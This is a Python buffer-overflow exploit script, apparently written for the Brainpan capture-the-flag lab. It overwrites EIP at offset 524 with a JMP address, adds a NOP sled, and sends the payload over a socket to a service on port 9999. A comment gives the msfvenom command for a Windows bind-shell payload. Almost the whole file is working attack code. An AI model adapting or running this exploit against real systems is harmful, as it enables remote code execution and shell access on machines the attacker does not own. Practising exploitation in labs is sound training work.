import socket,time,sys

ip = "192.168.0.105"
port = 9999
timeout = 5
prefix = ""
offset = 524
eip = "\xf3\x12\x17\x31" # JMP address found in brainpan.exe using mona.py
nops = "\x90" * 30
buf =  "" # generated using msfvenom
# msfvenom -p windows/shell_bind_tcp LPORT=4444 -EXITFUNC=thread -f py -b "\x00"
payload = "A" * offset + eip + nops + buf

string = prefix + payload
print(string)

try:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip,port))
        s.recv(1024)
        s.send(bytes(string,"latin-1"))
        s.recv(1024)
except:
    print("Can't connect to the server")
    sys.exit(0)

time.sleep(1)
